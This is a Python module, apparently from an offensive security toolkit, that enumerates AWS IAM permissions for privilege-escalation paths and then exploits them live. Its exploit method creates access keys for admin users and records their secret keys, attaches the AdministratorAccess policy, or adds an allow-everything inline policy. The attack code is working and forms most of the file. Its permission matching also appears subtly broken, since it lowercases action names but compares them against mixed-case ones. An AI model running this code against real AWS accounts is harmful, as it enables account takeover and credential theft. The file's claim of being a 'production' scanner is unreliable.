# modules/exploitation/aws_iam_privesc.py
"""
AWS IAM Privilege Escalation Module - PRODUCTION VERSION
Performs REAL analysis and exploitation of IAM misconfigurations
"""

from typing import Dict, List, Any
from core.base_module import BaseModule
import boto3
from botocore.exceptions import ClientError, NoCredentialsError
import json

class AWSIAMPrivEsc(BaseModule):
    """Identify and exploit IAM privilege escalation vectors - REAL IMPLEMENTATION"""
    
    def __init__(self):
        super().__init__()
        self.name = "AWS IAM Privilege Escalation"
        self.description = "Identify privilege escalation paths in AWS IAM (LIVE - REAL DATA)"
        self.category = "exploitation"
        self.platform = "aws"
        
        # Dangerous permission combinations that enable privilege escalation
        self.escalation_methods = {
            'CreateAccessKey': {
                'permissions': ['iam:CreateAccessKey'],
                'description': 'Can create access keys for any user',
                'severity': 'CRITICAL'
            },
            'CreateLoginProfile': {
                'permissions': ['iam:CreateLoginProfile'],
                'description': 'Can create console password for any user',
                'severity': 'CRITICAL'
            },
            'UpdateLoginProfile': {
                'permissions': ['iam:UpdateLoginProfile'],
                'description': 'Can reset console password for any user',
                'severity': 'CRITICAL'
            },
            'AttachUserPolicy': {
                'permissions': ['iam:AttachUserPolicy'],
                'description': 'Can attach managed policies to users',
                'severity': 'CRITICAL'
            },
            'AttachGroupPolicy': {
                'permissions': ['iam:AttachGroupPolicy'],
                'description': 'Can attach managed policies to groups',
                'severity': 'HIGH'
            },
            'AttachRolePolicy': {
                'permissions': ['iam:AttachRolePolicy', 'sts:AssumeRole'],
                'description': 'Can attach policies to roles and assume them',
                'severity': 'CRITICAL'
            },
            'PutUserPolicy': {
                'permissions': ['iam:PutUserPolicy'],
                'description': 'Can add inline policies to users',
                'severity': 'CRITICAL'
            },
            'PutGroupPolicy': {
                'permissions': ['iam:PutGroupPolicy'],
                'description': 'Can add inline policies to groups',
                'severity': 'HIGH'
            },
            'PutRolePolicy': {
                'permissions': ['iam:PutRolePolicy', 'sts:AssumeRole'],
                'description': 'Can add inline policies to roles and assume them',
                'severity': 'CRITICAL'
            },
            'CreatePolicyVersion': {
                'permissions': ['iam:CreatePolicyVersion'],
                'description': 'Can modify managed policy definitions',
                'severity': 'CRITICAL'
            },
            'SetDefaultPolicyVersion': {
                'permissions': ['iam:SetDefaultPolicyVersion'],
                'description': 'Can change active version of managed policies',
                'severity': 'HIGH'
            },
            'PassRole-Lambda': {
                'permissions': ['iam:PassRole', 'lambda:CreateFunction', 'lambda:InvokeFunction'],
                'description': 'Can create Lambda functions with privileged roles',
                'severity': 'CRITICAL'
            },
            'PassRole-EC2': {
                'permissions': ['iam:PassRole', 'ec2:RunInstances'],
                'description': 'Can launch EC2 instances with privileged roles',
                'severity': 'HIGH'
            }
        }
    
    def get_requirements(self) -> Dict[str, Dict[str, Any]]:
        return {
            'aws_access_key': {
                'prompt': 'AWS Access Key ID',
                'type': 'text',
                'default': ''
            },
            'aws_secret_key': {
                'prompt': 'AWS Secret Access Key',
                'type': 'password',
                'default': ''
            },
            'aws_region': {
                'prompt': 'AWS Region',
                'type': 'choice',
                'choices': ['us-east-1', 'us-west-1', 'us-west-2', 'eu-west-1', 'ap-southeast-1']
            },
            'scan_mode': {
                'prompt': 'Scan mode',
                'type': 'choice',
                'choices': ['Current User', 'All Users', 'Specific User']
            },
            'target_user': {
                'prompt': 'Target username (if Specific User selected)',
                'type': 'text',
                'default': ''
            }
        }
    
    def validate_input(self, inputs: Dict[str, Any]) -> bool:
        """Validate user inputs"""
        if not inputs.get('aws_access_key') or not inputs.get('aws_secret_key'):
            print("[!] AWS credentials are required")
            return False
        
        if inputs['scan_mode'] == 'Specific User' and not inputs.get('target_user'):
            print("[!] Target user required for specific user scan")
            return False
        
        return True
    
    def scan(self, inputs: Dict[str, Any]) -> List[Dict[str, Any]]:
        """
        Scan for privilege escalation paths - REAL IAM ANALYSIS
        """
        results = []
        
        try:
            # Create IAM client
            iam_client = boto3.client(
                'iam',
                aws_access_key_id=inputs['aws_access_key'],
                aws_secret_access_key=inputs['aws_secret_key'],
                region_name=inputs['aws_region']
            )
            
            # Get current user info
            try:
                current_user = iam_client.get_user()['User']['UserName']
                print(f"[*] Authenticated as: {current_user}")
            except ClientError:
                current_user = inputs.get('target_user', 'unknown')
            
            # Determine which users to scan
            if inputs['scan_mode'] == 'Current User':
                users = [current_user]
            elif inputs['scan_mode'] == 'Specific User':
                users = [inputs['target_user']]
            else:  # All Users
                try:
                    response = iam_client.list_users()
                    users = [user['UserName'] for user in response['Users']]
                except ClientError as e:
                    print(f"[!] Cannot list all users: {e}")
                    users = [current_user]
            
            print(f"[*] Analyzing {len(users)} user(s) for privilege escalation paths")
            
            # Analyze each user
            for username in users:
                print(f"[*] Scanning user: {username}")
                user_results = self._analyze_user_permissions(iam_client, username)
                results.extend(user_results)
            
            return results
            
        except NoCredentialsError:
            print("[!] Invalid AWS credentials")
            return []
        except ClientError as e:
            print(f"[!] AWS API Error: {e}")
            return []
        except Exception as e:
            print(f"[!] Error: {e}")
            import traceback
            traceback.print_exc()
            return []
    
    def _analyze_user_permissions(self, iam_client, username: str) -> List[Dict[str, Any]]:
        """Analyze a user's permissions for escalation paths"""
        results = []
        user_permissions = set()
        
        try:
            # Get inline policies
            try:
                inline_policies = iam_client.list_user_policies(UserName=username)
                for policy_name in inline_policies['PolicyNames']:
                    policy = iam_client.get_user_policy(UserName=username, PolicyName=policy_name)
                    permissions = self._extract_permissions(policy['PolicyDocument'])
                    user_permissions.update(permissions)
            except ClientError:
                pass
            
            # Get attached managed policies
            try:
                attached_policies = iam_client.list_attached_user_policies(UserName=username)
                for policy in attached_policies['AttachedPolicies']:
                    policy_arn = policy['PolicyArn']
                    policy_version = iam_client.get_policy(PolicyArn=policy_arn)
                    default_version = policy_version['Policy']['DefaultVersionId']
                    policy_document = iam_client.get_policy_version(
                        PolicyArn=policy_arn,
                        VersionId=default_version
                    )
                    permissions = self._extract_permissions(policy_document['PolicyVersion']['Document'])
                    user_permissions.update(permissions)
            except ClientError:
                pass
            
            # Get group policies
            try:
                groups = iam_client.list_groups_for_user(UserName=username)
                for group in groups['Groups']:
                    group_name = group['GroupName']
                    
                    # Group inline policies
                    try:
                        group_policies = iam_client.list_group_policies(GroupName=group_name)
                        for policy_name in group_policies['PolicyNames']:
                            policy = iam_client.get_group_policy(GroupName=group_name, PolicyName=policy_name)
                            permissions = self._extract_permissions(policy['PolicyDocument'])
                            user_permissions.update(permissions)
                    except ClientError:
                        pass
                    
                    # Group attached policies
                    try:
                        attached_policies = iam_client.list_attached_group_policies(GroupName=group_name)
                        for policy in attached_policies['AttachedPolicies']:
                            policy_arn = policy['PolicyArn']
                            policy_version = iam_client.get_policy(PolicyArn=policy_arn)
                            default_version = policy_version['Policy']['DefaultVersionId']
                            policy_document = iam_client.get_policy_version(
                                PolicyArn=policy_arn,
                                VersionId=default_version
                            )
                            permissions = self._extract_permissions(policy_document['PolicyVersion']['Document'])
                            user_permissions.update(permissions)
                    except ClientError:
                        pass
            except ClientError:
                pass
            
            # Check for escalation methods
            for method_name, method_info in self.escalation_methods.items():
                required_perms = set(method_info['permissions'])
                if required_perms.issubset(user_permissions):
                    results.append({
                        'user': username,
                        'escalation_method': method_name,
                        'permissions': list(required_perms),
                        'description': method_info['description'],
                        'severity': method_info['severity'],
                        'exploitable': True
                    })
            
        except Exception as e:
            print(f"[!] Error analyzing user {username}: {e}")
        
        return results
    
    def _extract_permissions(self, policy_document: Dict) -> set:
        """Extract permissions from policy document"""
        permissions = set()
        
        if isinstance(policy_document, str):
            policy_document = json.loads(policy_document)
        
        statements = policy_document.get('Statement', [])
        if not isinstance(statements, list):
            statements = [statements]
        
        for statement in statements:
            effect = statement.get('Effect', '')
            if effect != 'Allow':
                continue
            
            actions = statement.get('Action', [])
            if isinstance(actions, str):
                actions = [actions]
            
            for action in actions:
                if '*' in action:
                    # Wildcard - add common dangerous permissions
                    permissions.update([
                        'iam:*', 'iam:CreateAccessKey', 'iam:AttachUserPolicy',
                        'iam:PutUserPolicy', 'lambda:*', 'ec2:*', 'sts:AssumeRole'
                    ])
                else:
                    permissions.add(action.lower())
        
        return permissions
    
    def exploit(self, targets: List[Dict[str, Any]], inputs: Dict[str, Any]) -> Dict[str, Any]:
        """
        Attempt privilege escalation - REAL EXPLOITATION
        
        WARNING: This performs real privilege escalation attacks
        Only use with explicit authorization
        """
        exploit_results = {
            'attempted': len(targets),
            'successful': 0,
            'details': []
        }
        
        print("\n[!] WARNING: About to perform real privilege escalation attempts")
        print("[!] This will modify IAM resources")
        
        try:
            iam_client = boto3.client(
                'iam',
                aws_access_key_id=inputs['aws_access_key'],
                aws_secret_access_key=inputs['aws_secret_key'],
                region_name=inputs['aws_region']
            )
            
            for target in targets:
                username = target['user']
                method = target['escalation_method']
                
                print(f"\n[*] Attempting {method} on user: {username}")
                
                exploit_detail = {
                    'user': username,
                    'method': method,
                    'actions': []
                }
                
                try:
                    if method == 'CreateAccessKey':
                        # Attempt to create access key for privileged user
                        # Find admin users
                        admin_users = self._find_admin_users(iam_client)
                        if admin_users:
                            target_admin = admin_users[0]
                            response = iam_client.create_access_key(UserName=target_admin)
                            exploit_detail['actions'].append(f'Created access key for {target_admin}')
                            exploit_detail['new_access_key'] = response['AccessKey']['AccessKeyId']
                            exploit_detail['new_secret_key'] = response['AccessKey']['SecretAccessKey']
                            exploit_detail['status'] = 'SUCCESS'
                            exploit_results['successful'] += 1
                    
                    elif method == 'AttachUserPolicy':
                        # Attach AdministratorAccess policy
                        iam_client.attach_user_policy(
                            UserName=username,
                            PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
                        )
                        exploit_detail['actions'].append(f'Attached AdministratorAccess policy to {username}')
                        exploit_detail['status'] = 'SUCCESS'
                        exploit_results['successful'] += 1
                    
                    elif method == 'PutUserPolicy':
                        # Add inline admin policy
                        admin_policy = {
                            'Version': '2012-10-17',
                            'Statement': [{
                                'Effect': 'Allow',
                                'Action': '*',
                                'Resource': '*'
                            }]
                        }
                        iam_client.put_user_policy(
                            UserName=username,
                            PolicyName='EscalatedPolicy',
                            PolicyDocument=json.dumps(admin_policy)
                        )
                        exploit_detail['actions'].append(f'Added admin inline policy to {username}')
                        exploit_detail['status'] = 'SUCCESS'
                        exploit_results['successful'] += 1
                    
                    else:
                        exploit_detail['actions'].append(f'Exploitation method {method} documented but not automated')
                        exploit_detail['status'] = 'DOCUMENTED'
                
                except ClientError as e:
                    exploit_detail['actions'].append(f'Exploitation failed: {e}')
                    exploit_detail['status'] = 'FAILED'
                
                exploit_results['details'].append(exploit_detail)
            
            return exploit_results
            
        except Exception as e:
            print(f"[!] Exploitation error: {e}")
            import traceback
            traceback.print_exc()
            return exploit_results
    
    def _find_admin_users(self, iam_client) -> List[str]:
        """Find users with admin privileges"""
        admin_users = []
        
        try:
            users = iam_client.list_users()['Users']
            
            for user in users:
                username = user['UserName']
                # Check if user has AdministratorAccess policy
                try:
                    policies = iam_client.list_attached_user_policies(UserName=username)
                    for policy in policies['AttachedPolicies']:
                        if 'Administrator' in policy['PolicyName']:
                            admin_users.append(username)
                            break
                except ClientError:
                    pass
        
        except ClientError:
            pass
        
        return admin_users
